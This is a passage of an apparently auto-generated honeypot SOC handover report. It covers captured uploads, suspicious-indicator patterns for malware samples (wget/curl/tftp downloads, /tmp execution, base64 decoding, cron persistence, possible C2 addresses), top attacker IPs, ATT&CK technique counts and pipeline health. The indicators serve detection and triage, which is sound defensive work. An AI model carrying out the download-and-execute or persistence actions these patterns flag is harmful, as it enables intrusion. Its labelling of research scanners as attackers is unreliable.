| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.203.57[.]2` | US | Beijing Tiantexin Tech. Co., Ltd. | **100** ⚠️ | 50 |
| `111.175.88[.]6` | CN | CHINANET HUBEI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 0 |
| `130.12.180[.]174` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `45.79.211[.]97` | US | Linode | **100** ⚠️ | 50 |
| `89.248.172[.]11` | NL | FiberXpress BV | **100** ⚠️ | 0 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `200.69.35[.]17` | AR | SION S.A | **100** ⚠️ | 2 |
| `64.62.197[.]197` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `200.112.142[.]51` | AR | SION S.A | **100** ⚠️ | 5 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 136 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 106 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 81 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 81 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 81 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 10 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 236 cases |
| Tool 34  | Credential Extractor        | ✅ 148 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 18 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 67 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (10.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 37 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 106 priority case(s) shown individually · 43 recon entry/entries in table (19 group(s) consolidating 81 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-06T08:32:49Z_
